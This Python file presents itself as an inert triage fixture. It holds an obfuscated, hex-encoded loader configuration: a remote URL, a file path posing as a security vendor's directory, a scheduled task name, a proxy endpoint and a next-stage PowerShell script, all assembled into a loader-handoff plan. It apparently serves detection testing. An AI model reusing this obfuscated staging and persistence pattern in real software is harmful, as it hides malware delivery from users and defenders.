# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_26726abe = "8e554a948b8c7d888b55888a877e81847d7780878b8c44797b898d818a7d778a7d85878c7d447c7d7b877c7d777d857a7d7c7c7d7c448f8a818c7d777e81847d447c818b88798c7b8077888a877b7d8b8b94797c79888c7d8a557b88918c808786778487797c7d8a778079867c877e7e948b8c797f7d777b878d868c554d948b91868c7990558f79848a8d8b777a81867c81867f94877a7e8d8b7b798c818786557d907b7d888c818786778a878d8c81867f947b798a8a817d8a5588914a7d907d778f81867c878f8b778b7d8a8e817b7d948f81867c878f8b777b80798186558b7d8a8e817b7d777c7d8b7b8a81888c878a947b79858879817f8677817c557b79858879817f864549507d7c7b4d7a50797a948d8a8455808c8c888b52474749507d7c7b4d7a50797a467d90798588847d4681868e7984817c477a517c4b7d4f7e50468891948d8b7d8a77797f7d868c55608d868c8a7d8b8b68918c8087864749507d7c7b4d7a50797a947e81847d7788798c80555b5247688a877f8a79855c798c7947608d868c8a7d8b8b64797a47468d887c798c7d4549507d7c7b4d7a50797a4688919481868c7d8a888a7d8c7d8a7788798c80555b5247688a877f8a79855c798c794768918c8087864549507d7c7b4d7a50797a4788918c808786467d907d948c798b83778679857d556b918b8c7d856d887c798c7d4549507d7c7b4d7a50797a94888a879091777d867c888781868c55494a4f46484648464952494e4b504994867d908c778b8c797f7d558a7d8b878d8a7b7d458b798588847d46888b49"
CODEC_26726abe = "hex_literal|add_modulo_256|18"

def load_26726abe():
    return bytes.fromhex(MATERIAL_26726abe)

def decode_26726abe(item1):
    return bytes((value - 24) % 256 for value in item1)

def recover_26726abe():
    item4 = None
    try:
        item2 = decode_26726abe(load_26726abe())
    except (TypeError, ValueError) as error:
        raise RuntimeError("configuration recovery failed") from error
    item3 = item2.decode("ascii", "strict")
    return item3

def inspect_26726abe():
    return recover_26726abe()

def surface_26726abe():
    return surface if (surface := ("walrus_binding", "exception_routing", "py2exe_windows_service", "service_descriptor")) else ()

def obfuscation_26726abe():
    try:
        {}["missing"]
    except KeyError:
        return "exception_routing"

def plan_26726abe():
    fields = dict(item.split("=", 1) for item in inspect_26726abe().split("|"))
    analysis_surface = surface_26726abe()
    obfuscation_surface = obfuscation_26726abe()
    operation_plan = ("cpython_loader_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_26726abe())

# reconstruction complete